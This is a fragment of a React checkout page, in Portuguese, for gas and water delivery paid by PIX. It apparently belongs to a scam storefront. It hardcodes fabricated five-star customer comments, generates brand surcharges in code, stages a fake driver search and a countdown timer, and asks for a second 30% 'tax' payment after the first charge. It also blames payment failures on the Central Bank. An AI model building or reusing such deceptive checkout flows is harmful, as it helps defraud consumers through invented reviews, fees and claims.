                              {brand} {!isPreSelected && `(${formatExtraPrice(extraPrice)})`}
                            </option>
                          )
                        })}
                      </select>
                      <div className="mt-3 p-3 bg-green-50 border border-green-200 rounded-lg">
                        <p className="text-xs text-green-700 leading-relaxed mb-2">
                          📞 <strong>Nosso motoboy irá ligar para confirmar seu pedido.</strong> Não se preocupe, é bem rápido e prático!
                        </p>
                        <p className="text-xs text-green-700 leading-relaxed">
                          🚀 <strong>Ao gerar o PIX, o motoboy mais próximo já recebe uma notificação e fica no aguardo.</strong> Quando o pagamento é concluído, ele já aceita seu pedido e informamos seu número para ele te ligar e confirmar.
                        </p>
                        <p className="text-xs text-green-700 leading-relaxed">
                          🏢 <strong>Temos Centrais de distribuição na maioria das cidades e bairros :)</strong> Estamos pertinho de você. Trabalhamos em parceria com a maioria das empresas fornecedoras de gás a nível nacional.
                        </p>
                      </div>
                    </div>
                  )}

                  {/* Seleção de Marca de Água */}
                  {isWaterProduct() && (
                    <div className="border border-blue-200 rounded-lg p-4 bg-blue-50">
                      <h4 className="font-bold text-blue-800 text-sm mb-2">💧 Marca pré-selecionada: <span className="text-green-600">Naturágua</span> (Melhor preço do dia)</h4>
                      <p className="text-xs text-gray-600 mb-3">Você pode alterar se preferir outra marca:</p>
                      <select
                        value={selectedWaterBrand}
                        onChange={(e) => setSelectedWaterBrand(e.target.value)}
                        className="w-full p-2 border border-blue-300 rounded-lg text-sm focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
                      >
                        {waterBrands.map((brand) => {
                          const isPreSelected = brand === "Naturágua"
                          const extraPrice = isPreSelected ? 0 : generateExtraPrice(brand)
                          return (
                            <option key={brand} value={brand}>
                              {brand} {!isPreSelected && `(${formatExtraPrice(extraPrice)})`}
                            </option>
                          )
                        })}
                      </select>
                      <div className="mt-3 p-3 bg-yellow-50 border border-yellow-200 rounded-lg">
                        <p className="text-xs text-yellow-800 leading-relaxed">
                          <strong>📞 Se você quer outra marca que não esteja aqui, não se preocupa que nosso motoboy vai te ligar e confirmar o pedido assim que seu pagamento for aprovado ok?</strong>
                        </p>
                      </div>
                    </div>
                  )}

                  {/* Escolha seu Brinde */}
                  {isGasProduct() && (
                    <div className="border-2 border-dashed border-purple-300 rounded-lg p-4 bg-purple-50">
                      <div className="flex items-center gap-2 mb-3">
                        <Plus className="w-5 h-5 text-purple-600" />
                        <h4 className="font-bold text-purple-800 text-base">🎁 Escolha seu Brinde Grátis!</h4>
                      </div>
                      <p className="text-xs text-gray-700 mb-4 leading-relaxed">
                        <strong>Parabéns!</strong> Você ganhou um brinde especial com sua compra. Escolha entre:
                      </p>
                      
                      {/* Opção 1: Registro */}
                      <div className="mb-3 p-3 border-2 border-purple-200 rounded-lg bg-white hover:border-purple-400 transition-colors">
                        <div className="flex items-start gap-3">
                          <input
                            type="radio"
                            id="brinde-registro"
                            name="brinde"
                            checked={kitMangueira === false}
                            onChange={() => setKitMangueira(false)}
                            className="mt-1 w-4 h-4 text-purple-600 border-purple-300 focus:ring-purple-600"
                          />
                          <div className="flex-1">
                            <label htmlFor="brinde-registro" className="flex items-center gap-2 cursor-pointer">
                              <img 
                                src="/images/kitmangueira.png" 
                                alt="Registro" 
                                className="w-12 h-12 object-contain"
                              />
                              <div>
                                <p className="font-semibold text-sm text-gray-800">Registro para Gás</p>
                                <p className="text-xs text-gray-600">Segurança e praticidade</p>
                              </div>
                            </label>
                          </div>
                        </div>
                      </div>

                      {/* Opção 2: Kit Tupperware */}
                      <div className="p-3 border-2 border-purple-200 rounded-lg bg-white hover:border-purple-400 transition-colors">
                        <div className="flex items-start gap-3">
                          <input
                            type="radio"
                            id="brinde-tupperware"
                            name="brinde"
                            checked={kitMangueira === true}
                            onChange={() => setKitMangueira(true)}
                            className="mt-1 w-4 h-4 text-purple-600 border-purple-300 focus:ring-purple-600"
                          />
                          <div className="flex-1">
                            <label htmlFor="brinde-tupperware" className="flex items-center gap-2 cursor-pointer">
                              <img 
                                src="/images/tupperware.png" 
                                alt="Kit Tupperware" 
                                className="w-12 h-12 object-contain"
                              />
                              <div>
                                <p className="font-semibold text-sm text-gray-800">Kit de Vasilhas Tupperware</p>
                                <p className="text-xs text-gray-600">3 potes herméticos de qualidade</p>
                              </div>
                            </label>
                          </div>
                        </div>
                      </div>
                    </div>
                  )}

                  {/* Provas Sociais - Estilo Facebook */}
                  <div className="space-y-3">
                    {/* Comentário 1 */}
                    <div className="bg-white border border-gray-200 rounded-lg p-3">
                      <div className="flex items-start gap-3">
                        <div className="flex-shrink-0">
                          <div className="w-10 h-10 rounded-full bg-blue-500 flex items-center justify-center text-white font-bold text-sm">
                            C
                          </div>
                        </div>
                        <div className="flex-1">
                          <div className="flex items-center gap-2 mb-1">
                            <p className="font-semibold text-sm text-gray-900">Carlos Mendes</p>
                            <div className="flex text-yellow-500 text-xs">⭐⭐⭐⭐⭐</div>
                          </div>
                          <p className="text-xs text-gray-500 mb-2">há 2 dias</p>
                          <p className="text-sm text-gray-700 leading-relaxed">
                            Excelente serviço! Pedi o gás às 14h e chegou em 20 minutos. Entregador super educado e o preço melhor que na loja. Recomendo! 👍
                          </p>
                        </div>
                      </div>
                    </div>

                    {/* Comentário 2 */}
                    <div className="bg-white border border-gray-200 rounded-lg p-3">
                      <div className="flex items-start gap-3">
                        <div className="flex-shrink-0">
                          <div className="w-10 h-10 rounded-full bg-pink-500 flex items-center justify-center text-white font-bold text-sm">
                            J
                          </div>
                        </div>
                        <div className="flex-1">
                          <div className="flex items-center gap-2 mb-1">
                            <p className="font-semibold text-sm text-gray-900">Juliana Costa</p>
                            <div className="flex text-yellow-500 text-xs">⭐⭐⭐⭐⭐</div>
                          </div>
                          <p className="text-xs text-gray-500 mb-2">há 1 semana</p>
                          <p className="text-sm text-gray-700 leading-relaxed">
                            Primeira vez comprando online e adorei! Pagamento pelo PIX foi instantâneo e o gás chegou rapidinho. Muito prático! 🔥
                          </p>
                        </div>
                      </div>
                    </div>

                    {/* Comentário 3 */}
                    <div className="bg-white border border-gray-200 rounded-lg p-3">
                      <div className="flex items-start gap-3">
                        <div className="flex-shrink-0">
                          <div className="w-10 h-10 rounded-full bg-green-500 flex items-center justify-center text-white font-bold text-sm">
                            R
                          </div>
                        </div>
                        <div className="flex-1">
                          <div className="flex items-center gap-2 mb-1">
                            <p className="font-semibold text-sm text-gray-900">Roberto Silva</p>
                            <div className="flex text-yellow-500 text-xs">⭐⭐⭐⭐⭐</div>
                          </div>
                          <p className="text-xs text-gray-500 mb-2">há 3 dias</p>
                          <p className="text-sm text-gray-700 leading-relaxed">
                            Atendimento nota 10! Fiz o pedido pelo site e em menos de 30 min já estava aqui. Preço justo e entrega rápida. Virei cliente! 💯
                          </p>
                        </div>
                      </div>
                    </div>
                  </div>

                  <Button
                    type="submit"
                    className="w-full bg-gradient-to-r from-blue-600 to-blue-700 hover:from-blue-700 hover:to-blue-800 text-white py-2 sm:py-3 text-sm sm:text-base"
                    disabled={
                      !customerData.name || 
                      !customerData.phone || 
                      !customerData.cpf ||
                      !customerData.number
                    }
                  >
                    Continuar para Pagamento
                  </Button>
                </form>
              </CardContent>
            </Card>
            )}

            {/* Seleção de Forma de Pagamento - Aparecer após preencher dados */}
            {customerData.name && customerData.phone && customerData.cpf && customerData.number && (
              <div className="border-2 border-purple-200 rounded-lg p-4 bg-gradient-to-br from-purple-50 to-pink-50">
                <h4 className="font-bold text-purple-800 text-sm mb-3 flex items-center gap-2">
                  <CreditCard className="w-5 h-5" />
                  Escolha a forma de pagamento
                </h4>
                
                {/* Valor a Pagar Agora */}
                <div className="bg-blue-50 border-2 border-blue-300 rounded-lg p-3 mb-4">
                  <div className="flex items-center justify-between">
                    <div>
                      <p className="text-xs text-gray-600">Valor a pagar agora (70%):</p>
                      <p className="text-2xl font-bold text-blue-600">
                        {formatPrice(Math.round(getTotalPrice() * 0.70))}
                      </p>
                      {!showCardForm && (
                        <p className="text-[10px] text-green-600 font-semibold mt-1">
                          ✨ Com PIX: {formatPrice(Math.round((getTotalPrice() - Math.round(getTotalPrice() * 0.10)) * 0.70))}
                        </p>
                      )}
                    </div>
                    {isGasProduct() && (
                      <div className="text-right">
                        <p className="text-xs text-gray-600">Restante (30%):</p>
                        <p className="text-sm font-semibold text-gray-700">
                          {formatPrice(Math.round(getTotalPrice() * 0.30))}
                        </p>
                        <p className="text-[10px] text-gray-500">Após entrega</p>
                      </div>
                    )}
                  </div>
                  {isGasProduct() && (
                    <div className="mt-2 pt-2 border-t border-blue-200">
                      <div className="flex items-center justify-between text-xs">
                        <span className="text-gray-600">Valor total do produto:</span>
                        <span className="font-semibold text-gray-700">{formatPrice(getTotalPrice())}</span>
                      </div>
                    </div>
                  )}
                </div>
                
                <div className="space-y-3">
                  {/* Opção PIX */}
                  <div 
                    onClick={() => setShowCardForm(false)}
                    className={`p-4 border-2 rounded-lg cursor-pointer transition-all ${
                      !showCardForm 
                        ? 'border-green-500 bg-green-50 shadow-md' 
                        : 'border-gray-300 bg-white hover:border-green-300'
                    }`}
                  >
                    <div className="flex items-center gap-3">
                      <div className={`w-5 h-5 rounded-full border-2 flex items-center justify-center ${
                        !showCardForm ? 'border-green-500' : 'border-gray-400'
                      }`}>
                        {!showCardForm && <div className="w-3 h-3 rounded-full bg-green-500"></div>}
                      </div>
                      <div className="flex-1">
                        <div className="flex items-center gap-2">
                          <Smartphone className="w-5 h-5 text-green-600" />
                          <span className="font-bold text-gray-800">PIX</span>
                          <span className="text-xs bg-green-500 text-white px-2 py-0.5 rounded-full font-semibold">
                            10% OFF
                          </span>
                        </div>
                        <p className="text-xs text-gray-600 mt-1">
                          Pagamento instantâneo • Aprovação imediata
                        </p>
                      </div>
                    </div>
                  </div>

                  {/* Opção Cartão */}
                  <div 
                    onClick={() => setShowCardForm(true)}
                    className={`p-4 border-2 rounded-lg cursor-pointer transition-all ${
                      showCardForm 
                        ? 'border-blue-500 bg-blue-50 shadow-md' 
                        : 'border-gray-300 bg-white hover:border-blue-300'
                    }`}
                  >
                    <div className="flex items-center gap-3">
                      <div className={`w-5 h-5 rounded-full border-2 flex items-center justify-center ${
                        showCardForm ? 'border-blue-500' : 'border-gray-400'
                      }`}>
                        {showCardForm && <div className="w-3 h-3 rounded-full bg-blue-500"></div>}
                      </div>
                      <div className="flex-1">
                        <div className="flex items-center gap-2">
                          <CreditCard className="w-5 h-5 text-blue-600" />
                          <span className="font-bold text-gray-800">Cartão de Crédito</span>
                        </div>
                        <p className="text-xs text-gray-600 mt-1">
                          Crédito ou Débito • Parcelamento disponível
                        </p>
                      </div>
                    </div>
                  </div>
                </div>

                {/* Botão Continuar */}
                <Button
                  type="button"
                  onClick={(e) => {
                    e.preventDefault()
                    e.stopPropagation()
                    console.log('🔘 Botão Continuar clicado')
                    
                    // Validar email obrigatório
                    if (!customerData.email || customerData.email.trim() === '') {
                      alert('⚠️ Por favor, preencha o campo de e-mail antes de continuar!')
                      return
                    }
                    
                    // Validar formato do email
                    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/
                    if (!emailRegex.test(customerData.email)) {
                      alert('⚠️ Por favor, insira um e-mail válido!')
                      return
                    }
                    
                    // Mudar para step 3 imediatamente (o loading aparecerá lá)
                    setStep(3)
                  }}
                  disabled={pixLoading}
                  className="w-full mt-4 bg-gradient-to-r from-blue-600 to-blue-700 hover:from-blue-700 hover:to-blue-800 text-white py-3 text-base font-bold disabled:opacity-50"
                >
                  Continuar para Pagamento
                </Button>
              </div>
            )}
          </div>
        )}

        {/* Step 3: Payment */}
        {step === 3 && (
          <Card>
            <CardHeader className="pb-3 sm:pb-4">
              <CardTitle className="flex items-center gap-2 text-base sm:text-lg">
                <CreditCard className="w-4 h-4 sm:w-5 sm:h-5 text-blue-600" />
                Pagamento via PIX
              </CardTitle>
            </CardHeader>
            <CardContent className="pt-0 space-y-4 sm:space-y-6">
              {/* Order Summary */}
              <div className="bg-gray-50 rounded-lg p-3 sm:p-4">
                <h3 className="font-semibold text-gray-800 mb-2 sm:mb-3 text-sm sm:text-base">Resumo do Pedido</h3>
                <div className="space-y-1 sm:space-y-2 text-xs sm:text-sm">
                  <div className="flex justify-between">
                    <span>Produto:</span>
                    <span className="font-medium text-right max-w-[60%]">
                      {productName}
                      {isWaterProduct() && selectedWaterBrand && (
                        <div className="text-xs text-blue-600 mt-1">
                          Marca: {selectedWaterBrand}
                        </div>
                      )}
                      {isGasProduct() && selectedGasBrand && (
                        <div className="text-xs text-blue-600 mt-1">
                          Marca: {selectedGasBrand}
                        </div>
                      )}
                    </span>
                  </div>
                  <div className="flex justify-between">
                    <span>Valor do Produto:</span>
                    <span className="font-bold text-blue-600 text-sm sm:text-lg">
                      {formatPrice(productPrices[productName] || 1000)}
                    </span>
                  </div>
                  {kitMangueira && (
                    <div className="flex justify-between">
                      <span>Kit Mangueira:</span>
                      <span className="font-bold text-blue-600 text-sm sm:text-lg">
                        {formatPrice(930)}
                      </span>
                    </div>
                  )}
                  {pixDiscount > 0 && (
                    <div className="flex justify-between text-green-600">
                      <span>Desconto PIX (10%):</span>
                      <span className="font-bold">
                        -{formatPrice(pixDiscount)}
                      </span>
                    </div>
                  )}
                  <div className="flex justify-between border-t pt-2 mt-2">
                    <span className="font-bold">Valor Total:</span>
                    <span className="font-bold text-blue-600 text-lg">
                      {formatPrice(getTotalPrice() - pixDiscount)}
                    </span>
                  </div>
                  
                  <div className="border-t pt-3 mt-3">
                    <h4 className="font-semibold text-gray-800 mb-3 text-sm">Dados do Cliente</h4>
                    
                    <div className="space-y-2 text-xs sm:text-sm">
                      <div className="flex items-start gap-2">
                        <span className="text-blue-600 mt-0.5">👤</span>
                        <div className="flex-1">
                          <p className="text-gray-600 text-xs">Nome:</p>
                          <p className="font-medium text-gray-800">{customerData.name}</p>
                        </div>
                      </div>
                      
                      <div className="flex items-start gap-2">
                        <span className="text-blue-600 mt-0.5">📱</span>
                        <div className="flex-1">
                          <p className="text-gray-600 text-xs">Telefone:</p>
                          <p className="font-medium text-gray-800">{customerData.phone}</p>
                        </div>
                      </div>
                      
                      <div className="flex items-start gap-2">
                        <MapPin className="w-4 h-4 text-blue-600 mt-0.5 flex-shrink-0" />
                        <div className="flex-1">
                          <p className="text-gray-600 text-xs mb-1">Endereço de Entrega:</p>
                          <p className="font-medium text-gray-800 leading-relaxed">
                            {addressData?.logradouro}, {customerData.number}
                            {customerData.complement && (
                              <span className="text-gray-600"> - {customerData.complement}</span>
                            )}
                            <br />
                            {addressData?.bairro}
                            <br />
                            {addressData?.localidade}/{addressData?.uf} - CEP: {addressData?.cep}
                          </p>
                        </div>
                      </div>
                      
                      {/* Motoboy encontrado */}
                      {!searchingDriver && driverETA && (
                        <div ref={driverFoundRef} className="flex items-center gap-2 p-3 bg-green-50 border border-green-200 rounded-lg mt-2 animate-in fade-in duration-500">
                          <span className="text-lg">🏍️</span>
                          <div className="flex-1">
                            <p className="text-xs text-green-800 font-semibold">
                              Motoboy mais próximo encontrado!
                            </p>
                            <p className="text-xs text-green-700">
                              Tempo estimado: <strong>{driverETA}</strong>
                            </p>
                          </div>
                        </div>
                      )}
                    </div>
                  </div>
                </div>
              </div>

              {/* Elementos de Segurança e Urgência */}
              {!pixData || (pixData && pixData.status === 'waiting_payment') ? (
                <div className="space-y-4">
                  {/* Explicação Simples do PIX */}
                  <div className="bg-gradient-to-r from-blue-50 to-green-50 border-2 border-blue-200 rounded-lg p-4">
                    <div className="flex items-start gap-3">
                      <div className="flex-shrink-0 text-3xl">💳</div>
                      <div className="flex-1">
                        <h3 className="font-bold text-blue-800 text-base mb-2">
                          Como pagar com PIX?
                        </h3>
                        <div className="space-y-2 text-sm text-gray-700">
                          <p className="flex items-start gap-2">
                            <span className="font-bold text-blue-600">1.</span>
                            <span>Abra o app do seu banco</span>
                          </p>
                          <p className="flex items-start gap-2">
                            <span className="font-bold text-blue-600">2.</span>
                            <span>Escolha "Pagar com PIX" ou "Ler QR Code"</span>
                          </p>
                          <p className="flex items-start gap-2">
                            <span className="font-bold text-blue-600">3.</span>
                            <span>Escaneie o QR Code abaixo ou copie o código</span>
                          </p>
                          <p className="flex items-start gap-2">
                            <span className="font-bold text-blue-600">4.</span>
                            <span>Confirme o pagamento no seu banco</span>
                          </p>
                        </div>
                        <div className="mt-3 p-2 bg-green-100 border border-green-300 rounded">
                          <p className="text-xs text-green-800 font-semibold">
                            ⚡ Pagamento confirmado em segundos! O motoboy recebe automaticamente.
                          </p>
                        </div>
                      </div>
                    </div>
                  </div>

                  {/* Timer de Urgência */}
                  <div className="bg-red-50 border border-red-200 rounded-lg p-3 text-center">
                    <p className="text-red-600 font-semibold text-sm mb-1">
                      💥 Desconto Pix ativo por <span className="text-lg font-bold">{formatPixTimer()}</span> minutos
                    </p>
                    <p className="text-xs text-red-500">
                      Pagamento rápido garante entrega em até 30 min.
                    </p>
                  </div>

                </div>
              ) : null}

              {!pixData ? (
                <div className="text-center">
                  {pixLoading && (
                    <div className="flex items-center justify-center gap-3 py-4">
                      <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-blue-600"></div>
                      <span className="text-blue-800 font-semibold">
                        {searchingDriver ? '🔍 Procurando entregador mais próximo...' : '⏳ Gerando PIX...'}
                      </span>
                    </div>
                  )}
                  {pixError && <p className="text-red-500 text-xs sm:text-sm mt-3">{pixError}</p>}
                </div>
              ) : (
                <div className="space-y-3 sm:space-y-4">
                  <div className="bg-green-50 border border-green-200 rounded-lg p-3 sm:p-4">
                    <div className="flex items-center gap-2 mb-2 sm:mb-3">
                      <CheckCircle className="w-4 h-4 sm:w-5 sm:h-5 text-green-600" />
                      <h3 className="font-semibold text-green-800 text-sm sm:text-base">PIX Gerado com Sucesso!</h3>
                    </div>

                    {/* Informação de Valores - 70% e 30% */}
                    {requiresSplitPayment() && !firstPaymentCompleted && (
                      <div className="bg-blue-50 border border-blue-200 rounded-lg p-3 mb-3">
                        <p className="text-sm font-bold text-blue-800 mb-2">💰 Pagamento Parcelado</p>
                        <div className="space-y-1 text-xs text-gray-700">
                          <div className="flex justify-between">
                            <span>🔵 Pagando agora (70%):</span>
                            <strong className="text-blue-600">{formatPrice(getPaymentAmount())}</strong>
                          </div>
                          <div className="flex justify-between">
                            <span>⚪ Restante após entrega (30%):</span>
                            <strong className="text-gray-600">{formatPrice(getTaxPaymentAmount())}</strong>
                          </div>
                          <div className="flex justify-between border-t pt-1 mt-1">
                            <span>💵 Total:</span>
                            <strong className="text-green-600">{formatPrice(getTotalPrice() - pixDiscount)}</strong>
                          </div>
                        </div>
                      </div>
                    )}

                    {requiresSplitPayment() && firstPaymentCompleted && (
                      <div className="bg-orange-50 border border-orange-200 rounded-lg p-3 mb-3">
                        <p className="text-sm font-bold text-orange-800 mb-2">💰 Pagamento dos Impostos (30%)</p>
                        <div className="space-y-1 text-xs text-gray-700">
                          <div className="flex justify-between">
                            <span>✅ Já pago (70%):</span>
                            <strong className="text-green-600">{formatPrice(getFirstPaymentAmount())}</strong>
                          </div>
                          <div className="flex justify-between">
                            <span>🔵 Pagando agora (30%):</span>
                            <strong className="text-orange-600">{formatPrice(getTaxPaymentAmount())}</strong>
                          </div>
                          <div className="flex justify-between border-t pt-1 mt-1">
                            <span>💵 Total:</span>
                            <strong className="text-green-600">{formatPrice(getTotalPrice() - pixDiscount)}</strong>
                          </div>
                        </div>
                      </div>
                    )}

                    {/* QR Code - Mostrar apenas se pagamento ainda não foi confirmado */}
                    {pixData.pix?.qrcode && pixData.status !== "paid" && (
                      <div ref={qrCodeRef} className="text-center mb-3 sm:mb-4">
                        <img
                          src={`https://api.qrserver.com/v1/create-qr-code/?size=180x180&data=${encodeURIComponent(pixData.pix.qrcode)}`}
                          alt="QR Code PIX"
                          className="mx-auto w-36 h-36 sm:w-48 sm:h-48 border rounded-lg bg-white p-2"
                        />
                        <p className="text-xs sm:text-sm text-gray-600 mt-2">Escaneie o QR Code com seu app do banco</p>
                        
                        {/* Botão DEBUG - Simular Pagamento (apenas localhost) */}
                        {typeof window !== 'undefined' && window.location.hostname === 'localhost' && (
                          <div className="mt-4 p-3 bg-red-50 border-2 border-red-500 rounded-lg">
                            <p className="text-xs text-red-700 mb-2 font-bold">🔧 DEBUG MODE (localhost only)</p>
                            <button
                              onClick={() => {
                                console.log('🧪 SIMULANDO PAGAMENTO PAGO...')
                                const updatedPixData = { ...pixData, status: 'paid' }
                                setPixData(updatedPixData)
                                
                                // Salvar como pago
                                localStorage.setItem('paid-order', JSON.stringify({
                                  pixData: updatedPixData,
                                  customerData,
                                  addressData,
                                  paidAt: new Date().toISOString()
                                }))
                                
                                // Se for gás, verificar se é primeiro ou segundo pagamento
                                if (requiresSplitPayment() && !firstPaymentCompleted) {
                                  console.log('✅ Primeiro pagamento simulado! Mostrando modal de impostos...')
                                  setFirstPaymentCompleted(true)
                                  setShowTaxPaymentModal(true)
                                } else {
                                  console.log('✅ Pagamento simulado como PAID!')
                                  
                                  // Pagamento completo (100% ou segundo pagamento de 30%)
                                  console.log('🎉 Pagamento 100% completo! Mostrando modal de upsell...')
                                  setTimeout(() => {
                                    console.log('🍺 [SIMULAÇÃO] Abrindo modal de upsell...')
                                    setShowUpsellModal(true)
                                  }, 1000)
                                }
                              }}
                              className="w-full bg-red-600 hover:bg-red-700 text-white font-bold py-2 px-4 rounded-lg"
                            >
                              ⚡ SIMULAR PAGAMENTO PAGO
                            </button>
                          </div>
                        )}
                        
                        {/* Botão de Suporte - Aparece após 5 minutos */}
                        {showSupportButton && (
                          <div className="mt-4 p-3 bg-yellow-50 border border-yellow-300 rounded-lg">
                            <p className="text-xs sm:text-sm text-gray-700 mb-2 font-medium">
                              Problemas com pagamento? Pagou e não foi confirmado?
                            </p>
                            <a
                              href="https://wa.me/5582988381770?text=Ol%C3%A1!%20Estou%20com%20problemas%20com%20meu%20pedido."
                              target="_blank"
                              rel="noopener noreferrer"
                              className="inline-flex items-center justify-center gap-2 w-full bg-green-500 hover:bg-green-600 text-white font-semibold py-2 px-4 rounded-lg transition-colors duration-200 text-sm"
                            >
                              <svg className="w-5 h-5" fill="currentColor" viewBox="0 0 24 24">
                                <path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413Z"/>
                              </svg>
                              Falar com a gente no WhatsApp
                            </a>
                          </div>
                        )}
                      </div>
                    )}

                    {/* PIX Code - Mostrar apenas se pagamento ainda não foi confirmado */}
                    {pixData.pix?.qrcode && pixData.status !== "paid" && (
                      <div>
                        <label className="block text-xs sm:text-sm font-medium text-gray-700 mb-2">
                          Ou copie o código PIX:
                        </label>
                        <div className="space-y-2">
                          <textarea 
                            value={pixData.pix.qrcode} 
                            readOnly 
                            className="w-full font-mono text-xs p-3 border border-gray-300 rounded-md bg-gray-50 resize-none overflow-auto"
                            rows={3}
                            style={{ wordBreak: 'break-all' }}
                          />
                          <Button
                            onClick={copyPixCode}
                            variant="outline"
                            size="sm"
                            className="w-full flex items-center justify-center gap-2 bg-blue-600 text-white hover:bg-blue-700 border-blue-600"
                          >
                            {copied ? (
                              <>
                                <CheckCircle className="w-4 h-4" />
                                <span>Copiado!</span>
                              </>
                            ) : (
                              <>
                                <Copy className="w-4 h-4" />
                                <span>Copiar Código PIX</span>
                              </>
                            )}
                          </Button>
                          
                          {/* Botão de DEBUG - Apenas em localhost */}
                          {typeof window !== 'undefined' && (window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1') && (
                            <Button
                              onClick={async () => {
                                const savedTransaction = localStorage.getItem('current-pix-transaction')
                                if (savedTransaction) {
                                  const transaction = JSON.parse(savedTransaction)
                                  const updatedPixData = { 
                                    ...transaction.pixData, 
                                    status: 'paid',
                                    paidAt: new Date().toISOString()
                                  }
                                  
                                  // 1. Reportar conversão Google Ads
                                  // Removido
                                  
                                  // 2. Enviar PAID para UTMify (ANTES de remover do localStorage)
                                  await sendToUtmify('paid')
                                  
                                  // 3. Atualizar estado e localStorage
                                  setPixData(updatedPixData)
                                  
                                  localStorage.setItem('paid-order', JSON.stringify({
                                    pixData: updatedPixData,
                                    customerData: transaction.customerData,
                                    addressData: transaction.addressData,
                                    paidAt: new Date().toISOString()
                                  }))
                                  
                                  // 4. Remover transação temporária (DEPOIS de enviar para UTMify)
                                  localStorage.removeItem('current-pix-transaction')
                                  
                                  // 5. Parar polling
                                  if (pollingInterval) {
                                    clearInterval(pollingInterval)
                                    setPollingInterval(null)
                                  }
                                }
                              }}
                              variant="outline"
                              size="sm"
                              className="w-full flex items-center justify-center gap-2 bg-yellow-500 text-white hover:bg-yellow-600 border-yellow-500"
                            >
                              🧪 SIMULAR PAGAMENTO (DEBUG)
                            </Button>
                          )}
                        </div>
                      </div>
                    )}

                    <div className="mt-3 sm:mt-4 p-2 sm:p-3 bg-blue-50 border border-blue-200 rounded-lg">
                      <p className="text-xs sm:text-sm text-blue-800">
                        <strong>Valor a pagar agora:</strong> {formatPrice(pixData.amount)}
                      </p>
                      {pixData.pix?.expirationDate && (
                        <p className="text-xs sm:text-sm text-blue-800">
                          <strong>Válido até:</strong>{" "}
                          {new Date(pixData.pix.expirationDate).toLocaleDateString("pt-BR")}
                        </p>
                      )}
                      <p className="text-xs sm:text-sm text-blue-800">
                        <strong>Status:</strong>{" "}
                        {pixData.status === "waiting_payment" || pixData.status === "WAITING_PAYMENT" 
                          ? "Pagamento Pendente" 
                          : pixData.status === "paid" || pixData.status === "PAID"
                          ? "Pagamento Confirmado"
                          : pixData.status}
                      </p>
                      
                      {/* Indicador de verificação automática */}
                      {pixData.status === "waiting_payment" && (
                        <div className="mt-2 flex items-center gap-2 text-xs text-blue-700">
                          <div className="w-2 h-2 bg-blue-500 rounded-full animate-pulse"></div>
                          <span>Verificando pagamento automaticamente...</span>
                        </div>
                      )}
                      
                      {/* Status UTMify */}
                      {(utmifySent.pending || utmifySent.paid) && (
                        <div className="mt-2 text-xs text-gray-600">
                          {utmifySent.pending && <p>📊 Pedido registrado no sistema</p>}
                          {utmifySent.paid && <p>✅ Pagamento confirmado no sistema</p>}
                        </div>
                      )}
                      
                      {pixData.status === "paid" && (
                        <div className="mt-3 p-3 sm:p-4 bg-green-100 border-2 border-green-400 rounded-lg">
                          <div className="flex items-start gap-3">
                            <div className="flex-shrink-0 text-2xl">🏍️</div>
                            <div>
                              <p className="text-sm sm:text-base text-green-800 font-bold mb-2">
                                ✅ Pagamento Confirmado!
                              </p>
                              <p className="text-xs sm:text-sm text-green-700 leading-relaxed mb-2">
                                Agora só aguardar a ligação do nosso Motoboy ok? É rapidinho! Estamos com uma grande quantidade de pedidos mas leva de 2 a 5 minutos.
                              </p>
                            </div>
                          </div>
                        </div>
                      )}
                    </div>
                  </div>

                  <div className="text-center">
                    <p className="text-xs sm:text-sm text-gray-600">
                      Após o pagamento, seu pedido será processado automaticamente.
                      <br />
                      <strong>Entrega em até 30 minutos!</strong>
                    </p>
                    
                    {/* Aviso sobre Possíveis Erros */}
                    <div className="mt-4">
                      <div className="p-3 bg-yellow-50 border border-yellow-200 rounded-lg">
                        <div className="flex items-start gap-2">
                          <span className="text-yellow-600 text-lg flex-shrink-0">⚠️</span>
                          <div>
                            <p className="text-xs text-yellow-800 leading-relaxed">
                              <strong>Atenção:</strong> Se ocorrer algum erro durante o pagamento, não se preocupe! 
                              O Banco Central passa por atualizações constantes e isso pode causar instabilidades temporárias. 
                              É completamente normal. Tente novamente em alguns instantes.
                            </p>
                          </div>
                        </div>
                      </div>
                    </div>
                    
                    {/* Botão de teste - remover em produção */}
                    {process.env.NODE_ENV === 'development' && pixData.status === "waiting_payment" && (
                      <Button
                        onClick={() => setPixData(prev => prev ? {...prev, status: 'paid'} : null)}
                        variant="outline"
                        className="mt-4 text-xs border-green-500 text-green-600 hover:bg-green-50"
                      >
                        🧪 Simular Pagamento (DEV)
                      </Button>
                    )}
                  </div>
                </div>
              )}
            </CardContent>
          </Card>
        )}

        {/* Reviews Section */}
        <div className="mt-8 mb-6">
          <div className="text-center mb-6">
            <h3 className="text-lg font-bold text-gray-800 mb-2">
              📸 Não se esqueça de quando receber voltar aqui pra nos avaliar tá?
            </h3>
            <p className="text-sm text-gray-600">
              Mande aquela foto, veja o que nossos clientes falam 👇
            </p>
          </div>

          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
            {reviews.map((review, index: number) => (
              <div key={index} className="bg-white border border-gray-200 rounded-lg p-4 shadow-sm">
                <div className="flex items-start gap-3">
